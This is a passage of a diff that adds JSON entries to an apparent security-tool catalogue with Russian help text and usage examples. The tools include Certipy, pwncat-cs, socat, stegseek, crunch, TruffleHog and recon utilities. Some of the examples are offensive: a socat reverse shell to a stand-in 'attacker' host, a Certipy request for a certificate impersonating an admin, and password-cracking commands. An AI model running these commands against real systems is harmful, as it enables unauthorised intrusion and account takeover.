+  {
+    "id": "certipy",
+    "name": "Certipy",
+    "version": "4.8.2",
+    "categories": ["blackarch-exploitation", "blackarch-windows"],
+    "description": "Active Directory Certificate Services exploitation tool",
+    "descriptionRu": "Инструмент для перечисления и эксплуатации уязвимостей Active Directory Certificate Services (AD CS)",
+    "helpRu": "Certipy — инструмент для работы с Active Directory Certificate Services. Позволяет находить и эксплуатировать уязвимые шаблоны сертификатов.\n\nОсновные возможности:\n- Перечисление шаблонов сертификатов\n- Обнаружение уязвимых конфигураций (ESC1-ESC8)\n- Запрос сертификатов\n- Аутентификация через сертификат (PKINIT)\n- Golden Certificate атака\n- Shadow Credentials",
+    "url": "https://github.com/ly4k/Certipy",
+    "command": "certipy",
+    "usageExamples": [
+      {"title": "Перечисление AD CS", "command": "certipy find -u user@domain.local -p pass -dc-ip 10.10.10.1", "description": "Найти все шаблоны сертификатов и уязвимости"},
+      {"title": "Уязвимые шаблоны", "command": "certipy find -u user@domain.local -p pass -vulnerable", "description": "Показать только уязвимые шаблоны"},
+      {"title": "Запрос сертификата (ESC1)", "command": "certipy req -u user@domain.local -p pass -ca 'CA-Name' -template VulnTemplate -upn admin@domain.local", "description": "Запросить сертификат от имени другого пользователя"},
+      {"title": "Аутентификация", "command": "certipy auth -pfx admin.pfx -dc-ip 10.10.10.1", "description": "Аутентификация через сертификат"}
+    ],
+    "parameters": [
+      {"flag": "find", "description": "Перечисление шаблонов и уязвимостей"},
+      {"flag": "req", "description": "Запрос сертификата"},
+      {"flag": "auth", "description": "Аутентификация через сертификат"},
+      {"flag": "-u", "description": "Имя пользователя (user@domain)"},
+      {"flag": "-p", "description": "Пароль"},
+      {"flag": "-dc-ip", "description": "IP контроллера домена"},
+      {"flag": "-vulnerable", "description": "Показать только уязвимые шаблоны"},
+      {"flag": "-pfx", "description": "PFX-файл сертификата"}
+    ]
+  },
+  {
+    "id": "pwncat",
+    "name": "pwncat-cs",
+    "version": "0.5.4",
+    "categories": ["blackarch-exploitation", "blackarch-backdoor"],
+    "description": "Post-exploitation platform for Linux/Windows",
+    "descriptionRu": "Пост-эксплуатационная платформа и продвинутый обработчик reverse shell с автоматической разведкой и прайвеск",
+    "helpRu": "pwncat-cs — пост-эксплуатационная платформа, заменяющая стандартный netcat для обработки reverse shell. Автоматизирует многие задачи после получения доступа.\n\nОсновные возможности:\n- Обработка reverse/bind shell\n- Автоматическая разведка (Linux/Windows)\n- Загрузка/выгрузка файлов\n- Persistence (закрепление)\n- Privilege escalation модули\n- Перенаправление портов\n- Интерактивное меню",
+    "url": "https://github.com/calebstewart/pwncat",
+    "command": "pwncat-cs",
+    "usageExamples": [
+      {"title": "Слушатель reverse shell", "command": "pwncat-cs -lp 4444", "description": "Запустить слушатель на порту 4444"},
+      {"title": "Подключение к bind shell", "command": "pwncat-cs connect://target:4444", "description": "Подключиться к bind shell на цели"},
+      {"title": "SSH подключение", "command": "pwncat-cs ssh://user:pass@target", "description": "Подключиться через SSH для пост-эксплуатации"}
+    ],
+    "parameters": [
+      {"flag": "-lp", "description": "Слушать на указанном порту"},
+      {"flag": "connect://", "description": "Подключиться к bind shell"},
+      {"flag": "ssh://", "description": "Подключиться через SSH"},
+      {"flag": "run", "description": "Запустить модуль (в интерактивном режиме)"},
+      {"flag": "upload/download", "description": "Загрузка/выгрузка файлов"}
+    ]
+  },
+  {
+    "id": "rustscan",
+    "name": "RustScan",
+    "version": "2.1.1",
+    "categories": ["blackarch-scanner", "blackarch-recon"],
+    "description": "The modern port scanner — scans all 65k ports in 3 seconds",
+    "descriptionRu": "Современный сканер портов на Rust — сканирует все 65535 портов за 3 секунды, затем передаёт в Nmap",
+    "helpRu": "RustScan — невероятно быстрый сканер портов. Сначала быстро определяет открытые порты, затем передаёт их в Nmap для детального сканирования.\n\nОсновные возможности:\n- Сканирование всех 65535 портов за секунды\n- Автоматическая передача в Nmap\n- Adaptive learning (подстройка скорости)\n- Поддержка скриптов\n- Сканирование нескольких хостов\n- Настраиваемый batch size",
+    "url": "https://github.com/RustScan/RustScan",
+    "command": "rustscan",
+    "usageExamples": [
+      {"title": "Быстрое сканирование", "command": "rustscan -a target", "description": "Сканировать все порты и передать в Nmap"},
+      {"title": "Указание диапазона портов", "command": "rustscan -a target -r 1-1000", "description": "Сканирование только первых 1000 портов"},
+      {"title": "С Nmap флагами", "command": "rustscan -a target -- -sV -sC", "description": "Передать флаги -sV -sC в Nmap"},
+      {"title": "Несколько хостов", "command": "rustscan -a 192.168.1.1,192.168.1.2,192.168.1.3", "description": "Сканирование нескольких целей"}
+    ],
+    "parameters": [
+      {"flag": "-a", "description": "Адрес цели (IP или домен)"},
+      {"flag": "-r", "description": "Диапазон портов"},
+      {"flag": "-b", "description": "Batch size (количество одновременных соединений)"},
+      {"flag": "-t", "description": "Тайм-аут соединения (мс)"},
+      {"flag": "--ulimit", "description": "Лимит файловых дескрипторов"},
+      {"flag": "--", "description": "Передать остальные аргументы в Nmap"}
+    ]
+  },
+  {
+    "id": "sshuttle",
+    "name": "sshuttle",
+    "version": "1.1.2",
+    "categories": ["blackarch-tunnel", "blackarch-proxy"],
+    "description": "Transparent proxy server that works as a poor man's VPN over SSH",
+    "descriptionRu": "Прозрачный прокси-сервер через SSH — VPN для бедных, не требует прав на удалённом сервере",
+    "helpRu": "sshuttle — создаёт VPN-подобный туннель через SSH, не требуя root-прав или установки ПО на сервере. Маршрутизирует весь TCP-трафик через SSH-соединение.\n\nОсновные возможности:\n- Прозрачное проксирование через SSH\n- Не требует прав root на сервере\n- Маршрутизация всего трафика или указанных подсетей\n- DNS проксирование\n- Работает на Linux и macOS",
+    "url": "https://github.com/sshuttle/sshuttle",
+    "command": "sshuttle",
+    "usageExamples": [
+      {"title": "Туннель для подсети", "command": "sshuttle -r user@server 10.0.0.0/8", "description": "Маршрутизировать трафик к 10.0.0.0/8 через SSH-сервер"},
+      {"title": "Весь трафик", "command": "sshuttle -r user@server 0/0", "description": "Проксировать весь трафик через SSH"},
+      {"title": "С DNS", "command": "sshuttle --dns -r user@server 0/0", "description": "Проксировать весь трафик включая DNS"},
+      {"title": "Указание SSH-ключа", "command": "sshuttle -r user@server 10.0.0.0/8 --ssh-cmd 'ssh -i ~/.ssh/key'", "description": "Использовать SSH-ключ"}
+    ],
+    "parameters": [
+      {"flag": "-r", "description": "Удалённый сервер (user@host)"},
+      {"flag": "--dns", "description": "Проксировать DNS-запросы"},
+      {"flag": "--ssh-cmd", "description": "Пользовательская команда SSH"},
+      {"flag": "-x", "description": "Исключить подсеть из маршрутизации"},
+      {"flag": "-v", "description": "Подробный вывод"},
+      {"flag": "--daemon", "description": "Запустить в фоне"}
+    ]
+  },
+  {
+    "id": "socat",
+    "name": "Socat",
+    "version": "1.8.0",
+    "categories": ["blackarch-tunnel", "blackarch-proxy", "blackarch-networking"],
+    "description": "Multipurpose relay for bidirectional data transfer",
+    "descriptionRu": "Многоцелевой ретранслятор для двунаправленной передачи данных между сокетами, файлами, пайпами и устройствами",
+    "helpRu": "Socat (SOcket CAT) — продвинутый аналог Netcat. Устанавливает двунаправленный поток данных между двумя адресами (сокеты, файлы, процессы, устройства и др.).\n\nОсновные возможности:\n- TCP/UDP соединения и слушатели\n- SSL/TLS шифрование\n- UNIX сокеты\n- Перенаправление портов\n- Файл-дескрипторы и пайпы\n- PTY для интерактивных шеллов\n- SOCKS4/4a прокси",
+    "url": "http://www.dest-unreach.org/socat/",
+    "command": "socat",
+    "usageExamples": [
+      {"title": "Перенаправление порта", "command": "socat TCP-LISTEN:8080,fork TCP:target:80", "description": "Перенаправление трафика с порта 8080 на target:80"},
+      {"title": "Стабильный reverse shell", "command": "socat TCP:attacker:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", "description": "Полностью интерактивный reverse shell с PTY"},
+      {"title": "Слушатель для reverse shell", "command": "socat file:`tty`,raw,echo=0 TCP-LISTEN:4444", "description": "Слушатель для интерактивного reverse shell"},
+      {"title": "SSL-шифрованный туннель", "command": "socat TCP-LISTEN:443,fork OPENSSL:target:443", "description": "SSL-обёртка для соединения"}
+    ],
+    "parameters": [
+      {"flag": "TCP-LISTEN:port", "description": "Слушать на TCP-порту"},
+      {"flag": "TCP:host:port", "description": "Подключиться к TCP"},
+      {"flag": "EXEC:command", "description": "Выполнить команду"},
+      {"flag": "OPENSSL:host:port", "description": "SSL-соединение"},
+      {"flag": "fork", "description": "Обрабатывать несколько соединений"},
+      {"flag": "pty", "description": "Выделить псевдотерминал"},
+      {"flag": "reuseaddr", "description": "Переиспользовать адрес"}
+    ]
+  },
+  {
+    "id": "foremost",
+    "name": "Foremost",
+    "version": "1.5.7",
+    "categories": ["blackarch-forensic"],
+    "description": "Console program to recover files based on headers, footers and data structures",
+    "descriptionRu": "Утилита для восстановления удалённых файлов на основе заголовков, подвалов и внутренних структур данных",
+    "helpRu": "Foremost — инструмент для восстановления файлов (file carving) из образов дисков, дампов памяти или любых бинарных данных на основе сигнатур файлов.\n\nОсновные возможности:\n- Восстановление jpg, gif, png, bmp, avi, exe, mpg, wav, riff, wmv, mov, pdf, ole, doc, zip, rar, htm, cpp\n- Работа с образами дисков (dd, EnCase)\n- Пользовательские сигнатуры\n- Встроенная валидация файлов",
+    "url": "http://foremost.sourceforge.net/",
+    "command": "foremost",
+    "usageExamples": [
+      {"title": "Восстановление из образа", "command": "foremost -i disk.img -o output/", "description": "Извлечь все распознанные файлы из образа диска"},
+      {"title": "Только изображения", "command": "foremost -t jpg,png,gif -i disk.img -o output/", "description": "Извлечь только изображения"},
+      {"title": "С подробным выводом", "command": "foremost -v -i disk.img -o output/", "description": "Подробный вывод процесса восстановления"}
+    ],
+    "parameters": [
+      {"flag": "-i", "description": "Входной файл (образ диска)"},
+      {"flag": "-o", "description": "Директория для восстановленных файлов"},
+      {"flag": "-t", "description": "Типы файлов для восстановления"},
+      {"flag": "-v", "description": "Подробный вывод"},
+      {"flag": "-c", "description": "Файл конфигурации"},
+      {"flag": "-q", "description": "Быстрый режим (только начало файлов)"}
+    ]
+  },
+  {
+    "id": "steghide",
+    "name": "Steghide",
+    "version": "0.5.1",
+    "categories": ["blackarch-forensic", "blackarch-crypto"],
+    "description": "Steganography tool for hiding data in image and audio files",
+    "descriptionRu": "Инструмент стеганографии для скрытия и извлечения данных в изображениях (JPEG, BMP) и аудио (WAV, AU)",
+    "helpRu": "Steghide — инструмент стеганографии для встраивания и извлечения секретных данных из файлов-контейнеров (JPEG, BMP, WAV, AU).\n\nОсновные возможности:\n- Встраивание данных в JPEG, BMP, WAV, AU\n- Шифрование скрытых данных\n- Защита паролем\n- Сжатие данных перед встраиванием\n- Проверка контейнера на наличие скрытых данных",
+    "url": "https://steghide.sourceforge.net/",
+    "command": "steghide",
+    "usageExamples": [
+      {"title": "Скрыть файл в изображении", "command": "steghide embed -cf picture.jpg -ef secret.txt", "description": "Встроить secret.txt в picture.jpg"},
+      {"title": "Извлечь скрытые данные", "command": "steghide extract -sf picture.jpg", "description": "Извлечь скрытые данные из изображения"},
+      {"title": "Информация о контейнере", "command": "steghide info picture.jpg", "description": "Показать информацию о возможности встраивания"}
+    ],
+    "parameters": [
+      {"flag": "embed", "description": "Режим встраивания данных"},
+      {"flag": "extract", "description": "Режим извлечения данных"},
+      {"flag": "info", "description": "Информация о контейнере"},
+      {"flag": "-cf", "description": "Файл-контейнер (cover file)"},
+      {"flag": "-ef", "description": "Файл для встраивания (embed file)"},
+      {"flag": "-sf", "description": "Стего-файл (содержит скрытые данные)"},
+      {"flag": "-p", "description": "Пароль для шифрования/дешифрования"},
+      {"flag": "-f", "description": "Перезаписать без подтверждения"}
+    ]
+  },
+  {
+    "id": "stegseek",
+    "name": "Stegseek",
+    "version": "0.6",
+    "categories": ["blackarch-forensic", "blackarch-cracker"],
+    "description": "Lightning fast steghide cracker",
+    "descriptionRu": "Молниеносно быстрый инструмент перебора паролей для Steghide — до 300 миллионов попыток в секунду",
+    "helpRu": "Stegseek — инструмент для взлома паролей Steghide. Работает в тысячи раз быстрее, чем альтернативы (StegCracker).\n\nОсновные возможности:\n- До 300 миллионов паролей в секунду\n- Словарный перебор\n- Режим seed cracking (без словаря)\n- Совместимость со всеми форматами Steghide",
+    "url": "https://github.com/RickdeJager/stegseek",
+    "command": "stegseek",
+    "usageExamples": [
+      {"title": "Перебор по словарю", "command": "stegseek picture.jpg rockyou.txt", "description": "Взлом пароля Steghide по словарю rockyou"},
+      {"title": "Seed cracking", "command": "stegseek --seed picture.jpg", "description": "Crack без словаря через перебор seed значений"},
+      {"title": "С указанием выходного файла", "command": "stegseek picture.jpg wordlist.txt -xf extracted.txt", "description": "Извлечь данные в указанный файл"}
+    ],
+    "parameters": [
+      {"flag": "--seed", "description": "Режим seed cracking (без словаря)"},
+      {"flag": "-xf", "description": "Имя выходного файла"},
+      {"flag": "-t", "description": "Количество потоков"},
+      {"flag": "-f", "description": "Перезаписать выходной файл"}
+    ]
+  },
+  {
+    "id": "cewl",
+    "name": "CeWL",
+    "version": "6.1",
+    "categories": ["blackarch-cracker", "blackarch-recon"],
+    "description": "Custom word list generator from website content",
+    "descriptionRu": "Генератор пользовательских словарей на основе содержимого веб-сайта путём краулинга",
+    "helpRu": "CeWL (Custom Word List generator) — инструмент для генерации словарей на основе текста, найденного на целевом веб-сайте. Идеально для создания контекстных словарей для атак паролей.\n\nОсновные возможности:\n- Краулинг веб-сайта и извлечение слов\n- Настройка глубины краулинга\n- Фильтрация по длине слов\n- Сбор email-адресов\n- Генерация мета-данных (авторы документов)\n- Поддержка аутентификации",
+    "url": "https://github.com/digininja/CeWL",
+    "command": "cewl",
+    "usageExamples": [
+      {"title": "Генерация словаря", "command": "cewl https://example.com -w wordlist.txt", "description": "Создать словарь из слов на сайте"},
+      {"title": "С глубиной и мин. длиной", "command": "cewl https://example.com -d 3 -m 6 -w wordlist.txt", "description": "Краулинг на 3 уровня, слова от 6 символов"},
+      {"title": "Сбор email", "command": "cewl https://example.com -e --email_file emails.txt", "description": "Извлечь email-адреса с сайта"},
+      {"title": "С числами и спецсимволами", "command": "cewl https://example.com --with-numbers -w wordlist.txt", "description": "Включить слова с числами"}
+    ],
+    "parameters": [
+      {"flag": "-w", "description": "Сохранить словарь в файл"},
+      {"flag": "-d", "description": "Глубина краулинга (по умолчанию 2)"},
+      {"flag": "-m", "description": "Минимальная длина слова"},
+      {"flag": "-e", "description": "Собирать email-адреса"},
+      {"flag": "--email_file", "description": "Файл для сохранения email-адресов"},
+      {"flag": "--with-numbers", "description": "Включить слова с числами"},
+      {"flag": "-c", "description": "Показать количество вхождений каждого слова"}
+    ]
+  },
+  {
+    "id": "crunch",
+    "name": "Crunch",
+    "version": "3.6",
+    "categories": ["blackarch-cracker"],
+    "description": "Wordlist generator with charset and pattern support",
+    "descriptionRu": "Генератор словарей с поддержкой наборов символов, шаблонов и перестановок",
+    "helpRu": "Crunch — генератор словарей, создающий списки слов на основе указанных параметров (длина, набор символов, шаблоны).\n\nОсновные возможности:\n- Генерация по длине и набору символов\n- Шаблоны (паттерны)\n- Перестановки\n- Сжатие выходных данных\n- Вывод в stdout для pipe",
+    "url": "https://sourceforge.net/projects/crunch-wordlist/",
+    "command": "crunch",
+    "usageExamples": [
+      {"title": "Все комбинации 4-6 символов", "command": "crunch 4 6 abcdefghijklmnopqrstuvwxyz -o wordlist.txt", "description": "Генерация всех слов длиной 4-6 из строчных букв"},
+      {"title": "По шаблону", "command": "crunch 8 8 -t pass@@%% -o wordlist.txt", "description": "Шаблон: pass + 2 строчные буквы + 2 цифры"},
+      {"title": "Pipe в Hashcat", "command": "crunch 6 6 0123456789 | hashcat -m 0 hash.txt", "description": "Генерация и передача напрямую в Hashcat"}
+    ],
+    "parameters": [
+      {"flag": "min", "description": "Минимальная длина слова (первый аргумент)"},
+      {"flag": "max", "description": "Максимальная длина слова (второй аргумент)"},
+      {"flag": "-t", "description": "Шаблон (@ = строчная, , = прописная, % = цифра, ^ = символ)"},
+      {"flag": "-o", "description": "Выходной файл"},
+      {"flag": "-p", "description": "Режим перестановок"},
+      {"flag": "-z", "description": "Сжатие (gzip, bzip2, lzma)"}
+    ]
+  },
+  {
+    "id": "lynis",
+    "name": "Lynis",
+    "version": "3.1.1",
+    "categories": ["blackarch-defensive", "blackarch-scanner"],
+    "description": "Security auditing and hardening tool for Unix systems",
+    "descriptionRu": "Инструмент аудита безопасности и проверки защищённо��ти Unix/Linux систем",
+    "helpRu": "Lynis — инструмент для глубокого аудита безопасности Unix-систем. Выполняет сотни проверок и предлагает рекомендации по улучшению безопасности.\n\nОсновные возможности:\n- Аудит конфигурации системы\n- Проверка установленного ПО и обновлений\n- Анализ файрвола и iptables\n- Проверка SSH-конфигурации\n- Аудит файловых систем и прав\n- Проверка логирования и аудита\n- Генерация отчёта с рекомендациями",
+    "url": "https://github.com/CISOfy/lynis",
+    "command": "lynis",
+    "usageExamples": [
+      {"title": "Полный аудит системы", "command": "lynis audit system", "description": "Запустить полный аудит безопасности системы"},
+      {"title": "Быстрый аудит", "command": "lynis audit system --quick", "description": "Быстрая проверка без пауз между тестами"},
+      {"title": "Проверка профиля", "command": "lynis show profiles", "description": "Показать доступные профили аудита"}
+    ],
+    "parameters": [
+      {"flag": "audit system", "description": "Полный аудит системы"},
+      {"flag": "--quick", "description": "Быстрый режим (без пауз)"},
+      {"flag": "--pentest", "description": "Режим пентеста (без привилегий root)"},
+      {"flag": "--profile", "description": "Использовать указанный профиль"},
+      {"flag": "show", "description": "Показать информацию (profiles, settings, commands)"},
+      {"flag": "--cronjob", "description": "Режим для cron (без цвета и пауз)"}
+    ]
+  },
+  {
+    "id": "trufflehog",
+    "name": "TruffleHog",
+    "version": "3.67.0",
+    "categories": ["blackarch-recon", "blackarch-code-audit"],
+    "description": "Find leaked credentials in git repos, S3 buckets, and more",
+    "descriptionRu": "Поиск утечек секретов (API-ключи, пароли, токены) в Git-репозиториях, S3-бакетах и файловых системах",
+    "helpRu": "TruffleHog — инструмент для обнаружения секретов (API-ключи, пароли, токены, приватные ключи) в Git-репозиториях, S3-бакетах, файловых системах и других источниках.\n\nОсновные возможности:\n- Сканирование Git-истории (все коммиты)\n- Обнаружение 800+ типов секретов\n- Верификация найденных секретов (проверка на валидность)\n- GitHub/GitLab/S3/файловая система\n- Высокая скорость (Go)\n- Низкий процент ложных срабатываний",
+    "url": "https://github.com/trufflesecurity/trufflehog",
+    "command": "trufflehog",
+    "usageExamples": [
+      {"title": "Сканирование Git репо", "command": "trufflehog git https://github.com/user/repo", "description": "Поиск секретов во всей истории Git-репозитория"},
+      {"title": "Локальный репозиторий", "command": "trufflehog filesystem /path/to/code", "description": "Сканирование локальной файловой системы"},
+      {"title": "GitHub организация", "command": "trufflehog github --org=company", "description": "Сканирование всех репозиториев организации"},
+      {"title": "Только верифицированные", "command": "trufflehog git https://github.com/user/repo --only-verified", "description": "Показать только подтверждённые (валидные) секреты"}
+    ],
+    "parameters": [
+      {"flag": "git", "description": "Сканирование Git-репозитория"},
+      {"flag": "github", "description": "Сканирование GitHub (org/repo)"},
+      {"flag": "filesystem", "description": "Сканирование файловой системы"},
+      {"flag": "s3", "description": "Сканирование S3-бакета"},
+      {"flag": "--only-verified", "description": "Показать только верифицированные секреты"},
+      {"flag": "--json", "description": "Вывод в JSON формате"},
+      {"flag": "--concurrency", "description": "Количество параллельных потоков"}
+    ]
+  },
+  {
+    "id": "yara",
+    "name": "YARA",
+    "version": "4.5.0",
+    "categories": ["blackarch-forensic", "blackarch-malware"],
+    "description": "Pattern matching swiss knife for malware researchers",
+    "descriptionRu": "Швейцарский нож для исследователей вредоносного ПО — инструмент поиска по паттернам и правилам",
+    "helpRu": "YARA — инструмент для идентификации и классификации вредоносного ПО по правилам (rules). Позволяет описывать паттерны вредоносного ПО и искать их в файлах и процессах.\n\nОсновные возможности:\n- Текстовые и бинарные паттерны\n- Регулярные выражения\n- Условия на основе размера файла, энтропии и др.\n- Сканирование файлов, директорий, процессов\n- Модули (PE, ELF, hash, math и др.)\n- Интеграция с другими инструментами",
+    "url": "https://github.com/VirusTotal/yara",
+    "command": "yara",
+    "usageExamples": [
+      {"title": "Сканирование файла", "command": "yara rules.yar suspect_file", "description": "Проверить файл по набору YARA-правил"},
+      {"title": "Рекурсивное сканирование", "command": "yara -r rules.yar /suspect/directory/", "description": "Рекурсивное сканирование директории"},
+      {"title": "Сканирование процесса", "command": "yara rules.yar -p 1234", "description": "Сканировать процесс по PID"}
+    ],
+    "parameters": [
+      {"flag": "-r", "description": "Рекурсивное сканирование директорий"},
+      {"flag": "-s", "description": "Показать совпавшие строки"},
+      {"flag": "-m", "description": "Показать метаданные правил"},
+      {"flag": "-p", "description": "Сканировать процесс по PID"},
+      {"flag": "-t", "description": "Фильтр по тегу правил"},
+      {"flag": "-c", "description": "Показать только количество совпадений"},
+      {"flag": "-w", "description": "Отключить предупреждения"}
+    ]
+  },
+  {
+    "id": "dirsearch",
+    "name": "Dirsearch",
+    "version": "0.4.3",
+    "categories": ["blackarch-webapp", "blackarch-fuzzer"],
+    "description": "Web path brute-forcer with recursive scanning",
+    "descriptionRu": "Инструмент перебора директорий и файлов на веб-серверах с рекурсивным сканированием",
+    "helpRu": "Dirsearch — продвинутый инструмент brute-force директорий и файлов на веб-серверах. Простой, но функциональный.\n\nОсновные возможности:\n- Рекурсивное сканирование\n- Многопоточность\n- Поддержка расширений файлов\n- Фильтрация по статус-коду, размеру\n- Поддержка прокси и пользовательских заголовков\n- Автоматическое определение wildcard-ответов",
+    "url": "https://github.com/maurosoria/dirsearch",
+    "command": "dirsearch",
+    "usageExamples": [
+      {"title": "Базовое сканирование", "command": "dirsearch -u https://example.com", "description": "Перебор директорий с дефолтным словарём"},
+      {"title": "С расширениями", "command": "dirsearch -u https://example.com -e php,html,js", "description": "Поиск файлов с указанными расширениями"},
+      {"title": "Рекурсивное", "command": "dirsearch -u https://example.com -r -R 3", "description": "Рекурсивное сканирование до 3 уровней"}
+    ],
+    "parameters": [
+      {"flag": "-u", "description": "Целевой URL"},
+      {"flag": "-e", "description": "Расширения файлов"},
+      {"flag": "-w", "description": "Пользовательский словарь"},
+      {"flag": "-r", "description": "Включить рекурсию"},
+      {"flag": "-R", "description": "Глубина рекурсии"},
+      {"flag": "-t", "description": "Количество потоков"},
+      {"flag": "-x", "description": "Исключить статус-коды"},
+      {"flag": "--proxy", "description": "HTTP прокси"}
+    ]
+  },
+  {
+    "id": "paramspider",
+    "name": "ParamSpider",
+    "version": "2.0",
+    "categories": ["blackarch-recon", "blackarch-webapp"],
+    "description": "Mining URLs from dark corners of web archives for bug hunting",
+    "descriptionRu": "Извлечение URL с параметрами из веб-архивов для поиска уязвимостей",
+    "helpRu": "ParamSpider — инструмент для извлечения URL с параметрами из веб-архивов (Wayback Machine). Полезен для поиска скрытых эндпоинтов и параметров для тестирования.\n\nОсновные возможности:\n- Извлечение URL из Wayback Machine\n- Фильтрация по расширениям\n- Удаление дубликатов\n- Замена параметров на пользовательские значения",
+    "url": "https://github.com/devanshbatham/ParamSpider",
+    "command": "paramspider",
+    "usageExamples": [
+      {"title": "Поиск URL с параметрами", "command": "paramspider -d example.com", "description": "Извлечь все URL с параметрами из веб-архивов"},
+      {"title": "Исключить расширения", "command": "paramspider -d example.com --exclude jpg,png,css", "description": "Исключить медиафайлы и стили"}
+    ],
+    "parameters": [
+      {"flag": "-d", "description": "Целевой домен"},
+      {"flag": "--exclude", "description": "Исключить файлы с указанными расширениями"},
+      {"flag": "-o", "description": "Выходной файл"},
+      {"flag": "--level", "description": "Уровень краулинга"}
+    ]
+  },
+  {
+    "id": "gau",
+    "name": "gau",
+    "version": "2.2.1",
+    "categories": ["blackarch-recon", "blackarch-webapp"],
+    "description": "Fetch known URLs from AlienVault OTX, Wayback Machine, and Common Crawl",
+    "descriptionRu": "Сбор известных URL домена из AlienVault OTX, Wayback Machine и Common Crawl",
+    "helpRu": "gau (GetAllUrls) — инструмент для сбора всех известных URL домена из различных источников.\n\nИсточники данных:\n- Wayback Machine\n- Common Crawl\n- AlienVault OTX\n- URLScan\n\nОсновные возможности:\n- Быстрый сбор из нескольких источников\n- Фильтрация по параметрам\n- Поддержка pipe\n- Blacklist расширений",
+    "url": "https://github.com/lc/gau",
+    "command": "gau",
+    "usageExamples": [
+      {"title": "Сбор URL домена", "command": "gau example.com", "description": "Получить все известные URL для домена"},
+      {"title": "С фильтрацией", "command": "gau --blacklist png,jpg,gif example.com", "description": "Исключить изображения"},
+      {"title": "Pipe в другие инструменты", "command": "echo example.com | gau | grep '=' | sort -u", "description": "Найти URL с параметрами"}
+    ],
+    "parameters": [
+      {"flag": "--blacklist", "description": "Исключить расширения файлов"},
+      {"flag": "--subs", "description": "Включить поддомены"},
+      {"flag": "--providers", "description": "Указать провайдеры (wayback, otx, commoncrawl, urlscan)"},
+      {"flag": "--o", "description": "Выходной файл"},
+      {"flag": "--threads", "description": "Количество потоков"}
+    ]
+  },
+  {
+    "id": "waybackurls",
+    "name": "Waybackurls",
+    "version": "0.1.0",
+    "categories": ["blackarch-recon"],
+    "description": "Fetch all URLs that the Wayback Machine knows about for a domain",
+    "descriptionRu": "Получение всех URL из Wayback Machine для указанного домена",
+    "helpRu": "Waybackurls — простой инструмент для получения всех URL, которые Wayback Machine знает о домене.\n\nИдеален для:\n- Обнаружения скрытых эндпоинтов\n- Поиска старых страниц и параметров\n- Сбора данных для дальнейшего анализа",
+    "url": "https://github.com/tomnomnom/waybackurls",
+    "command": "waybackurls",
+    "usageExamples": [
+      {"title": "Получить URL", "command": "echo example.com | waybackurls", "description": "Все URL из Wayback Machine"},
+      {"title": "С уникальными путями", "command": "echo example.com | waybackurls | sort -u", "description": "Уникальные URL"},
+      {"title": "Сохранить в файл", "command": "echo example.com | waybackurls > urls.txt", "description": "Сохранить все URL в файл"}
+    ],
+    "parameters": [
+      {"flag": "-dates", "description": "Показать даты захвата"},
+      {"flag": "-no-subs", "description": "Исключить поддомены"},
+      {"flag": "-get-versions", "description": "Получить все версии каждого URL"}
+    ]
+  },
+  {
+    "id": "assetfinder",
+    "name": "Assetfinder",
+    "version": "0.1.1",
+    "categories": ["blackarch-recon"],
+    "description": "Find domains and subdomains related to a given domain",
+    "descriptionRu": "Поиск связанных доменов и поддоменов для заданного домена",
+    "helpRu": "Assetfinder — быстрый инструмент для обнаружения связанных доменов и поддоменов.\n\nИсточники данных:\n- crt.sh (Certificate Transparency)\n- Certspotter\n- HackerTarget\n- ThreatCrowd\n- Wayback Machine\n- DNS буферизация",
+    "url": "https://github.com/tomnomnom/assetfinder",
+    "command": "assetfinder",
+    "usageExamples": [
+      {"title": "Поиск поддоменов", "command": "assetfinder example.com", "description": "Найти все связанные домены и поддомены"},
+      {"title": "Только поддомены", "command": "assetfinder --subs-only example.com", "description": "Показать только поддомены целевого домена"},
+      {"title": "Pipe в httpx", "command": "assetfinder example.com | httpx -status-code", "description": "Найти поддомены и проверить их доступность"}
+    ],
+    "parameters": [
+      {"flag": "--subs-only", "description": "Показать только поддомены (не связанные домены)"}
+    ]
+  },
+  {
+    "id": "dnsx",
+    "name": "dnsx",
+    "version": "1.2.1",
+    "categories": ["blackarch-recon", "blackarch-scanner"],
+    "description": "Fast and multi-purpose DNS toolkit",
+    "descriptionRu": "Быстрый многоцелевой DNS-тулкит от ProjectDiscovery для массового резолвинга и проверки DNS",
+    "helpRu": "dnsx — быстрый DNS-тулкит для массового резолвинга доменов, обратного DNS и извлечения DNS-записей.\n\nОсновные возможности:\n- Массовый DNS-резолвинг\n- Поддержка всех типов записей (A, AAAA, MX, NS, TXT, CNAME, SOA, PTR)\n- Wildcard фильтрация\n- Обратный DNS\n- Поддержка pipe",
+    "url": "https://github.com/projectdiscovery/dnsx",
+    "command": "dnsx",
+    "usageExamples": [
+      {"title": "Массовый резолвинг", "command": "cat subdomains.txt | dnsx", "description": "Резолвить список поддоменов"},
+      {"title": "Все DNS записи", "command": "echo example.com | dnsx -recon", "description": "Получить все типы DNS-записей"},
+      {"title": "A записи с IP", "command": "cat subdomains.txt | dnsx -a -resp", "description": "Показать A-записи с IP-адресами"}
+    ],
+    "parameters": [
+      {"flag": "-a/-aaaa/-mx/-ns/-txt/-cname", "description": "Тип DNS-записи"},
+      {"flag": "-resp", "description": "Показать ответы"},
+      {"flag": "-recon", "description": "Все типы записей"},
+      {"flag": "-r", "description": "Файл с DNS-серверами"},
+      {"flag": "-t", "description": "Количество потоков"},
+      {"flag": "-o", "description": "Выходной файл"},
+      {"flag": "-wd", "description": "Wildcard домен для фильтрации"}
+    ]
+  },
+  {
+    "id": "subjack",
+    "name": "Subjack",
+    "version": "1.0",
+    "categories": ["blackarch-recon", "blackarch-webapp"],
+    "description": "Subdomain takeover vulnerability scanner",
+    "descriptionRu": "Сканер уязвимостей захвата поддоменов (subdomain takeover)",
+    "helpRu": "Subjack — инструмент для обнаружения уязвимых поддоменов, которые можно захватить (subdomain takeover).\n\nПроверяет:\n- GitHub Pages\n- Heroku\n- AWS S3\n- Azure\n- Shopify\n- FastlyВ и другие сервисы\n\nSubdomain takeover происходит, когда CNAME указывает на сервис, который больше не используется.",
+    "url": "https://github.com/haccer/subjack",
+    "command": "subjack",
+    "usageExamples": [
+      {"title": "Проверка списка поддоменов", "command": "subjack -w subdomains.txt -t 100 -ssl", "description": "Проверить поддомены на уязвимость захвата"},
+      {"title": "С кастомными fingerprints", "command": "subjack -w subdomains.txt -c fingerprints.json", "description": "Использовать пользовательские сигнатуры"}
+    ],
+    "parameters": [
+      {"flag": "-w", "description": "Файл со списком поддоменов"},
+      {"flag": "-t", "description": "Количество потоков"},
+      {"flag": "-ssl", "description": "Проверять через HTTPS"},
